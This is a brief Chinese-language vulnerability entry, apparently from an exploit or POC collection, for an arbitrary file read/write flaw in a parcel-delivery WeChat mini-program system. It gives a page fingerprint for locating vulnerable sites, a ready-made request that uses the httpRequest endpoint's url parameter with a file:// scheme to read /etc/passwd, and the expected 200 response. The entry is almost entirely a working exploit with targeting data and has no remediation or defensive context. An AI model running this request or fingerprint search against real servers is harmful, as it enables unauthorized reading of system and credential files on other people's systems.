# 快递微信小程序系统httpRequest任意文件读取漏洞

快递微信小程序系统httpRequest ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="static/default/newwap/lang/js/jquery.localize.min.js"`
- **请求**：`GET /weixin/index/httpRequest?url=file:///etc/passwd HTTP/2`
- **响应特征**：200